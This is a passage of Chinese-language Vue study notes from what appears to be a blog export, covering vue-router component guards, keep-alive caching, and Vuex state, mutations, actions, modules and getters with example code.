<h2 id="组件内的守卫"><a href="#组件内的守卫" class="headerlink" title="组件内的守卫"></a>组件内的守卫</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> Foo = &#123;</span><br><span class="line">  template: <span class="string">`...`</span>,</span><br><span class="line">  beforeRouteEnter (to, <span class="keyword">from</span>, next) &#123;</span><br><span class="line">    <span class="comment">// 在渲染该组件的对应路由被 confirm 前调用</span></span><br><span class="line">    <span class="comment">// 不！能！获取组件实例 `this`</span></span><br><span class="line">    <span class="comment">// 因为当守卫执行前，组件实例还没被创建</span></span><br><span class="line">  &#125;,</span><br><span class="line">  beforeRouteUpdate (to, <span class="keyword">from</span>, next) &#123;</span><br><span class="line">    <span class="comment">// 在当前路由改变，但是该组件被复用时调用</span></span><br><span class="line">    <span class="comment">// 举例来说，对于一个带有动态参数的路径 /foo/:id，在 /foo/1 和 /foo/2 之间跳转的时候，</span></span><br><span class="line">    <span class="comment">// 由于会渲染同样的 Foo 组件，因此组件实例会被复用。而这个钩子就会在这个情况下被调用。</span></span><br><span class="line">    <span class="comment">// 可以访问组件实例 `this`</span></span><br><span class="line">  &#125;,</span><br><span class="line">  beforeRouteLeave (to, <span class="keyword">from</span>, next) &#123;</span><br><span class="line">    <span class="comment">// 导航离开该组件的对应路由时调用</span></span><br><span class="line">    <span class="comment">// 可以访问组件实例 `this`</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h1 id="keep-alive的使用"><a href="#keep-alive的使用" class="headerlink" title="keep-alive的使用"></a>keep-alive的使用</h1><ul>
<li>在keep-alive标签下加入需要保存状态的组件  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">keep-alive</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">router-view</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">keep-alive</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>保存离开页面时地址的业务逻辑  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">name: <span class="string">&#x27;Home&#x27;</span>,</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">        path: <span class="string">&#x27;/home/news&#x27;</span></span></span><br><span class="line">    &#125;</span><br><span class="line">    &#125;,</span><br><span class="line"><span class="javascript">    <span class="comment">//在组件活跃时跳转到path路径</span></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="title">activated</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="string">&#x27;Home activated&#x27;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">this</span>.$router.push(<span class="built_in">this</span>.path);</span></span><br><span class="line">    &#125;,</span><br><span class="line"><span class="javascript">    <span class="comment">//组件离开时保存路径</span></span></span><br><span class="line"><span class="javascript">    beforeRouteLeave (to, <span class="keyword">from</span>, next) &#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">this</span>.path = <span class="built_in">this</span>.$route.path;</span></span><br><span class="line">    next();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="keep-alive属性"><a href="#keep-alive属性" class="headerlink" title="keep-alive属性"></a>keep-alive属性</h2></li>
<li>include:字符串或正则表达，只有匹配的组件才会被缓存</li>
<li>exclude:字符串或正则表达，任何匹配的组件都不会被缓存</li>
<li>匹配name属性(可加入多个name)<ul>
<li>App.vue  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">keep-alive</span> <span class="attr">exclude</span>=<span class="string">&quot;User,About&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">router-view</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">keep-alive</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>User.vue  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">        name: <span class="string">&#x27;User&#x27;</span>,</span></span><br><span class="line">        computed: &#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">userId</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">return</span> <span class="built_in">this</span>.$route.params.userId;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>Vue-cli</tag>
        <tag>Vue-router</tag>
      </tags>
  </entry>
  <entry>
    <title>Vuex基础学习</title>
    <url>/2020/11/10/Vuex%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="vue-vuex学习"><a href="#vue-vuex学习" class="headerlink" title="vue_vuex学习"></a>vue_vuex学习</h1><h2 id="vuex结构"><a href="#vuex结构" class="headerlink" title="vuex结构"></a>vuex结构</h2><ul>
<li>src/store/index.js  <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> Vuex <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span></span><br><span class="line"></span><br><span class="line">Vue.use(Vuex)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">    state: &#123;</span><br><span class="line">    &#125;,</span><br><span class="line">    mutations: &#123;</span><br><span class="line">    &#125;,</span><br><span class="line">    actions: &#123;</span><br><span class="line">    &#125;,</span><br><span class="line">    modules: &#123;</span><br><span class="line">    &#125;,</span><br><span class="line">    getter: &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
<li><code>state</code> : state中保存了数据，可以放在各个组件中的数据，组件想要获取到数据，有两种方式</li>
<li><code>mutation</code> : mutation只做纯粹的state数据修改操作，mutation需要被提交（commit）才能执行</li>
<li><code>action</code> : action可以进行异步请求，将数据commit给mutation。action中还可以进行数据处理，将数据处理成mutation可以直接使用的数据</li>
<li><code>modules</code> : store的子模块，为了开发大型项目，方便状态管理而使用的</li>
<li><code>getters</code> : 对state属性进行计算，可以理解类似于Vue中computed<h2 id="引入vuex"><a href="#引入vuex" class="headerlink" title="引入vuex"></a>引入vuex</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&#x27;./store&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  router,</span><br><span class="line">  store,</span><br><span class="line">  render: <span class="function"><span class="params">h</span> =&gt;</span> h(App)</span><br><span class="line">&#125;).$mount(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="vuex的使用"><a href="#vuex的使用" class="headerlink" title="vuex的使用"></a>vuex的使用</h2><h3 id="state"><a href="#state" class="headerlink" title="state"></a>state</h3><p><code>src/store/index.js</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">  state: &#123;</span><br><span class="line">    counter: <span class="number">10</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p><code>App.vue</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123;$store.state.counter&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="mutation"><a href="#mutation" class="headerlink" title="mutation"></a>mutation</h3><p><code>src/store/index.js</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">  state: &#123;</span><br><span class="line">    counter: <span class="number">10</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  mutations: &#123;</span><br><span class="line">    <span class="function"><span class="title">addCounter</span>(<span class="params">state</span>)</span> &#123;</span><br><span class="line">      state.counter++</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="function"><span class="title">addCountNum</span>(<span class="params">state, num</span>)</span> &#123;</span><br><span class="line">      state.counter += num</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="function"><span class="title">addStudent</span>(<span class="params">state, stu</span>)</span> &#123;</span><br><span class="line">      state.student.push(stu)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p><code>App.vue</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123;$store.state.counter&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> @<span class="attr">click</span>=<span class="string">&quot;add&quot;</span>&gt;</span>+<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;addNum(10)&quot;</span>&gt;</span>10+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;addStudent&quot;</span>&gt;</span>stu+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">  name: <span class="string">&#x27;App&#x27;</span>,</span></span><br><span class="line">  components: &#123;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line"><span class="javascript">    <span class="function"><span class="title">add</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">this</span>.$store.commit(<span class="string">&#x27;addCounter&#x27;</span>)</span></span><br><span class="line">    &#125;,</span><br><span class="line"><span class="javascript">    <span class="function"><span class="title">addNum</span>(<span class="params">num</span>)</span> &#123; <span class="comment">//传参提交</span></span></span><br><span class="line"><span class="javascript">      <span class="built_in">this</span>.$store.commit(<span class="string">&#x27;addCountNum&#x27;</span>, num)</span></span><br><span class="line">    &#125;,</span><br><span class="line"><span class="javascript">    <span class="function"><span class="title">addStudent</span>(<span class="params"></span>)</span> &#123; <span class="comment">//传参提交（参数为对象）</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">let</span> stu = &#123;<span class="attr">name</span>: <span class="string">&#x27;test&#x27;</span>, <span class="attr">age</span>: <span class="number">50</span>&#125;;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">this</span>.$store.commit(<span class="string">&#x27;addStudent&#x27;</span>, stu)</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>mutation添加和删除state<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123;$store.state.info&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">  name: <span class="string">&#x27;App&#x27;</span>,</span></span><br><span class="line">  components: &#123;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line"><span class="javascript">    <span class="function"><span class="title">updata</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">this</span>.$store.commit(<span class="string">&#x27;updataIn&#x27;</span>)</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">  state: &#123;</span><br><span class="line">    info: &#123;</span><br><span class="line">      age: <span class="number">12</span>,</span><br><span class="line">      name: <span class="string">&#x27;xxx&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  mutations: &#123;</span><br><span class="line">    <span class="function"><span class="title">updataIn</span>(<span class="params">state</span>)</span> &#123;</span><br><span class="line">      <span class="comment">//使用set增加state，第一个属性为修改的对象，第二个属性为key/index，第三个属性为值</span></span><br><span class="line">      <span class="comment">// Vue.set(state.info,&#x27;address&#x27;,&#x27;ShangHai&#x27;)</span></span><br><span class="line">      <span class="comment">//使用delete删除state，第一个属性为修改的对象，第二个属性为key/index</span></span><br><span class="line">      <span class="comment">// Vue.delete(state.info,&#x27;age&#x27;)</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
<li>mutation的提交风格<ul>
<li>这种方式在store中接收到的为num的值</li>
<li>```javascript<br>  //vue中的method提交<br>  this.$store.commit(‘addCountNum’, num)<br>  //store接收<br>  addCountNum(state, num) {<pre><code>  state.counter += num</code></pre>
  }  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 这种方式在store中接收到的为对象</span><br><span class="line">-   &#96;&#96;&#96;javascript</span><br><span class="line">    &#x2F;&#x2F;vue中的method提交</span><br><span class="line">    this.$store.commit(</span><br><span class="line">        type:&#39;addCountNum&#39;,</span><br><span class="line">        num</span><br><span class="line">    )</span><br><span class="line">    &#x2F;&#x2F;store接收</span><br><span class="line">    addCountNum(state, num) &#123; &#x2F;&#x2F;此时的num为一个对象，而传来的num为对象里的属性，num可写为payload</span><br><span class="line">        state.counter +&#x3D; num.num</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="action"><a href="#action" class="headerlink" title="action"></a>action</h3></li>
</ul>
</li>
<li>通常情况下<code>mutation</code>的方法必须是同步方法，主要是<code>devtools</code>不能捕捉到<code>mutation</code>的异步操作会什么时候完成</li>
<li><code>action</code>类似于<code>mutation</code>，但是是用来替代<code>mutation</code>完成异步操作的</li>
<li>常规使用<ul>
<li><code>src/store/index.js</code><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">  state: &#123;</span><br><span class="line">    info: &#123;</span><br><span class="line">      age: <span class="number">12</span>,</span><br><span class="line">      name: <span class="string">&#x27;xxx&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  mutations: &#123;</span><br><span class="line">    <span class="function"><span class="title">updataIn</span>(<span class="params">state</span>)</span> &#123;</span><br><span class="line">      state.info.name = <span class="string">&#x27;test&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  actions: &#123;</span><br><span class="line">    <span class="comment">//context:上下文</span></span><br><span class="line">     <span class="function"><span class="title">updataInfo</span>(<span class="params">context,payload</span>)</span>&#123;</span><br><span class="line">       <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">         context.commit(<span class="string">&#x27;updataIn&#x27;</span>)</span><br><span class="line">         <span class="built_in">console</span>.log(payload.message)</span><br><span class="line">         payload.success()</span><br><span class="line">       &#125;,<span class="number">1000</span>)</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
<li><code>App.vue</code><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123;$store.state.info&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;updata&quot;</span>&gt;</span>updata<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">  name: <span class="string">&#x27;App&#x27;</span>,</span></span><br><span class="line">  components: &#123;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line"><span class="javascript">    <span class="function"><span class="title">updata</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">this</span>.$store.dispatch(</span></span><br><span class="line"><span class="javascript">          <span class="string">&#x27;updataInfo&#x27;</span>,</span></span><br><span class="line">          &#123;</span><br><span class="line"><span class="javascript">            message: <span class="string">&#x27;传递的信息&#x27;</span>,</span></span><br><span class="line"><span class="javascript">            success: <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">              <span class="built_in">console</span>.log(<span class="string">&#x27;传递成功&#x27;</span>)</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      )</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li>结合Promise使用<ul>
<li><code>src/store/index.js</code><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">  state: &#123;</span><br><span class="line">    info: &#123;</span><br><span class="line">      age: <span class="number">12</span>,</span><br><span class="line">      name: <span class="string">&#x27;xxx&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  mutations: &#123;</span><br><span class="line">    <span class="function"><span class="title">updataIn</span>(<span class="params">state</span>)</span> &#123;</span><br><span class="line">      state.info.name = <span class="string">&#x27;test&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  actions: &#123;</span><br><span class="line">    <span class="comment">//context:上下文</span></span><br><span class="line">    <span class="function"><span class="title">updataInfo</span>(<span class="params">context,payload</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">          context.commit(<span class="string">&#x27;updataIn&#x27;</span>)</span><br><span class="line">          <span class="built_in">console</span>.log(payload.message)</span><br><span class="line">          payload.success()</span><br><span class="line">          resolve(<span class="string">&#x27;111&#x27;</span>)</span><br><span class="line">        &#125;,<span class="number">1000</span>)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
<li><code>App.vue</code><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123;$store.state.info&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;updata&quot;</span>&gt;</span>updata<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">  name: <span class="string">&#x27;App&#x27;</span>,</span></span><br><span class="line">  components: &#123;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line"><span class="javascript">    <span class="function"><span class="title">updata</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">this</span>.$store.dispatch(</span></span><br><span class="line"><span class="javascript">          <span class="string">&#x27;updataInfo&#x27;</span>,</span></span><br><span class="line">          &#123;</span><br><span class="line"><span class="javascript">            message: <span class="string">&#x27;传递的信息&#x27;</span>,</span></span><br><span class="line"><span class="javascript">            success: <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">              <span class="built_in">console</span>.log(<span class="string">&#x27;传递成功&#x27;</span>)</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line"><span class="javascript">      ).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(res)</span></span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="modules"><a href="#modules" class="headerlink" title="modules"></a>modules</h3><code>src/store/index.js</code><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> moduleA =&#123;</span><br><span class="line">  state: &#123;</span><br><span class="line">    name: <span class="string">&#x27;2020/08/07&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  mutations: &#123;</span><br><span class="line">    <span class="function"><span class="title">updata</span>(<span class="params">state</span>)</span> &#123;</span><br><span class="line">      state.name = <span class="string">&#x27;08/07&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  action: &#123;&#125;,</span><br><span class="line">  getters:&#123;</span><br><span class="line">    <span class="function"><span class="title">updataName</span>(<span class="params">state</span>)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> state.name + <span class="string">&#x27;/00&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="function"><span class="title">fullname</span>(<span class="params">state, getters, rootState</span>)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> getters.updataName + rootState.counter</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">  modules: &#123;</span><br><span class="line">    a: moduleA</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<code>App.vue</code><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123;$store.state.a.name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123;$store.getters.updataName&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123;$store.getters.fullname&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;updataName&quot;</span>&gt;</span>updataName+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">  name: <span class="string">&#x27;App&#x27;</span>,</span></span><br><span class="line">  components: &#123;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line"><span class="javascript">    <span class="function"><span class="title">updataName</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">this</span>.$store.commit(<span class="string">&#x27;updata&#x27;</span>)</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li>使用modules中的<code>state</code>时，<code>$store</code>后需接上定义的模块名</li>
<li>使用modules中的<code>mutations</code>时，与之前相同，<code>commit</code>里的type类型是统一的，首先会搜先<code>store</code>，之后再搜索其他模块，所以<code>mutations</code>之间最好不要同名</li>
<li>使用modules中的<code>action</code>时，与之前相同，<code>dispatch</code>里的type类型是统一的，首先会搜先<code>store</code>，之后再搜索其他模块，所以<code>action</code>之间最好不要同名</li>
<li>使用modules中的<code>getters</code>时，与之前相同，所以<code>getters</code>之间最好不要同名</li>
<li><code>modules</code>内可使用<code>rootState</code>参数来获取<code>store</code>里<code>state</code>的数据,可使用<code>rootGetters</code>参数来获取<code>store</code>里<code>getters</code>的数据，其他可直接调用<h3 id="getters"><a href="#getters" class="headerlink" title="getters"></a>getters</h3><code>src/store/index.js</code><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">  state: &#123;</span><br><span class="line">    counter: <span class="number">10</span>,</span><br><span class="line">    student: [</span><br><span class="line">      &#123;<span class="attr">name</span>: <span class="string">&#x27;joe&#x27;</span>, <span class="attr">age</span>: <span class="number">21</span>&#125;,</span><br><span class="line">      &#123;<span class="attr">name</span>: <span class="string">&#x27;jack&#x27;</span>, <span class="attr">age</span>: <span class="number">15</span>&#125;,</span><br><span class="line">      &#123;<span class="attr">name</span>: <span class="string">&#x27;curry&#x27;</span>, <span class="attr">age</span>: <span class="number">40</span>&#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  getters: &#123;</span><br><span class="line">      <span class="comment">//处理state里的值并返回</span></span><br><span class="line">    <span class="function"><span class="title">powerCounter</span>(<span class="params">state</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> state.counter * state.counter</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">//处理并筛选state里的对象并返回</span></span><br><span class="line">    <span class="function"><span class="title">more20stu</span>(<span class="params">state</span>)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> 